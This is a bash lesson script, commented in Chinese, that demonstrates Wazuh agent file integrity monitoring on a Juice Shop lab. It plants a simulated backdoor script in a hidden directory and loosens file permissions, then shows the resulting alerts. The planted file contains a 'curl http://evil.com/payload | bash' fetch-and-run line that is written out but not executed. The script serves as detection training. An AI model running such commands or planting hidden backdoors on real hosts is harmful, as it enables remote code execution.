#!/usr/bin/env bash
# Lesson 04 Attack Script
# 目标：演示 Wazuh Agent (HIDS) 对主机层威胁的检测。
# 注意：Juice Shop 为 distroless 镜像（无 shell），攻击操作通过 wazuh-agent 容器
#       写入共享卷完成，模拟攻击者在应用目录植入文件。

set -euo pipefail

echo "============================================"
echo "  Lesson 04: HIDS (Wazuh Agent) Demo"
echo "============================================"
echo ""

# 0. 确认容器正常运行
echo "[Step 0] 检查容器状态..."
WAZUH_RUNNING=$(docker compose ps --format "{{.Name}}\t{{.Status}}" 2>/dev/null | grep -c "^wazuh-agent" || echo "0")
if [ "$WAZUH_RUNNING" -gt 0 ]; then
  echo "  ✓ Wazuh Agent 正在运行"
else
  echo "  ✗ Wazuh Agent 未运行"
  echo "  请确保已运行: docker compose up -d"
  exit 1
fi
echo ""

# 1. 等待 FIM 基线扫描完成（确保后续篡改能被检测为"变化"）
echo "[Step 1] 等待 FIM 基线扫描完成..."
echo "  （首次扫描需要建立文件基线，此时不会产生告警）"
BASELINE_REACHED=false
for i in $(seq 1 120); do
  SCAN_END=$(docker compose logs wazuh-agent 2>/dev/null | grep -c "scan ended" || true)
  if [ "$SCAN_END" -gt 0 ]; then
    BASELINE_REACHED=true
    break
  fi
  sleep 1
done
if [ "$BASELINE_REACHED" = true ]; then
  echo "  ✓ 基线扫描已完成，后续文件变化将触发告警"
else
  echo "  ⚠ 超时，继续执行（基线可能仍在建立中）"
fi
echo ""

# 2. 清理上次攻击的残留（确保干净的环境）
echo "[Step 2] 清理历史攻击痕迹..."
docker exec wazuh-agent sh -c 'rm -rf /monitored/juice-shop/tmp/.hidden 2>/dev/null' || true
docker exec wazuh-agent sh -c 'chmod 644 /monitored/juice-shop/package.json 2>/dev/null' || true
echo "  ✓ 已清理"
echo ""

# 3. 等待下一次 FIM 扫描完成（确保清理被纳入基线）
echo "[Step 3] 等待 FIM 重新建立干净基线..."
SCAN_COUNT_BEFORE=$(docker compose logs wazuh-agent 2>/dev/null | grep -c "scan ended" || true)
for i in $(seq 1 40); do
  SCAN_COUNT_NOW=$(docker compose logs wazuh-agent 2>/dev/null | grep -c "scan ended" || true)
  if [ "$SCAN_COUNT_NOW" -gt "$SCAN_COUNT_BEFORE" ]; then
    echo "  ✓ 干净基线已建立（第 $((SCAN_COUNT_NOW - SCAN_COUNT_BEFORE)) 次新扫描）"
    break
  fi
  if [ "$i" -eq 40 ]; then
    echo "  ⚠ 等待超时，继续执行"
  fi
  sleep 1
done
echo ""

# 4. 模拟文件篡改攻击
echo "[Step 4] 模拟文件篡改攻击..."
echo "  创建可疑文件（模拟后门）..."
docker exec wazuh-agent sh -c 'mkdir -p /monitored/juice-shop/tmp/.hidden' 2>/dev/null || true
docker exec wazuh-agent sh -c 'echo "#!/bin/bash" > /monitored/juice-shop/tmp/.hidden/backdoor.sh' 2>/dev/null || true
docker exec wazuh-agent sh -c 'echo "# Reverse shell simulation" >> /monitored/juice-shop/tmp/.hidden/backdoor.sh' 2>/dev/null || true
docker exec wazuh-agent sh -c 'echo "curl http://evil.com/payload | bash" >> /monitored/juice-shop/tmp/.hidden/backdoor.sh' 2>/dev/null || true
docker exec wazuh-agent sh -c 'chmod +x /monitored/juice-shop/tmp/.hidden/backdoor.sh' 2>/dev/null || true
echo "  ✓ 可疑文件已创建: /monitored/juice-shop/tmp/.hidden/backdoor.sh"
echo ""

echo "  修改文件权限（触发属性变化告警）..."
docker exec wazuh-agent sh -c 'chmod 777 /monitored/juice-shop/package.json' 2>/dev/null || true
echo "  ✓ 文件权限已修改: package.json → 777"
echo ""

# 5. 等待 FIM 检测篡改
echo "[Step 5] 等待 FIM 检测变化..."
echo "  （等待下一次定期扫描，约 30 秒）"
SCAN_COUNT_BEFORE=$(docker compose logs wazuh-agent 2>/dev/null | grep -c "scan ended" || true)
for i in $(seq 1 40); do
  SCAN_COUNT_NOW=$(docker compose logs wazuh-agent 2>/dev/null | grep -c "scan ended" || true)
  if [ "$SCAN_COUNT_NOW" -gt "$SCAN_COUNT_BEFORE" ]; then
    echo "  ✓ FIM 扫描已完成，变化已上报 Manager"
    break
  fi
  if [ "$i" -eq 40 ]; then
    echo "  ⚠ 等待扫描超时"
  fi
  sleep 1
done
echo ""

# 6. 查看 Wazuh Manager 告警（FIM 告警在 Manager 端，不在 Agent 端）
echo "[Step 6] 查看 Wazuh Manager FIM 告警..."
echo "  等待告警从 Agent 同步到 Manager..."
sleep 5
echo "  最近的 FIM 相关告警（Rule 550-558）:"
echo ""
docker exec wazuh-manager sh -c "grep 'syscheck' /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -3" | python3 -c "
import sys, json
found = False
for line in sys.stdin:
    try:
        alert = json.loads(line.strip())
        rule_id = int(alert.get('rule', {}).get('id', 0))
        if 550 <= rule_id <= 558:
            found = True
            ts = alert.get('timestamp', '')
            desc = alert.get('rule', {}).get('description', '')
            full_log = alert.get('full_log', '')
            print(f'  [{ts}] Rule {rule_id}: {desc}')
            if full_log:
                for log_line in full_log.split(chr(10)):
                    log_line = log_line.strip()
                    if log_line:
                        print(f'    {log_line}')
                print()
    except Exception:
        pass
if not found:
    print('  (无 FIM 告警 — Agent 可能仍在初始化，请稍后重试)')
" 2>/dev/null || echo "  (无法读取告警 — Manager 可能未就绪)"
echo ""

# 7. 验证文件
echo "[Step 7] 验证文件完整性监控..."
echo "  攻击文件:"
docker exec wazuh-agent ls -la /monitored/juice-shop/tmp/.hidden/ 2>/dev/null || echo "  (目录不存在)"
echo ""

echo "============================================"
echo "  结论"
echo "============================================"
echo "  Wazuh Agent 通过共享 Docker 卷 (juice-shop-data) 监控"
echo "  Juice Shop 容器的文件完整性，检测文件篡改和权限变化。"
echo "  FIM 告警（Rule 550-558）在 Wazuh Manager 端聚合，"
echo "  不在 Agent 端直接输出 — 这是 Wazuh 的集中式架构设计。"
echo "  下一课：添加 SIEM (Wazuh Dashboard) 可视化这些告警！"
echo "============================================"
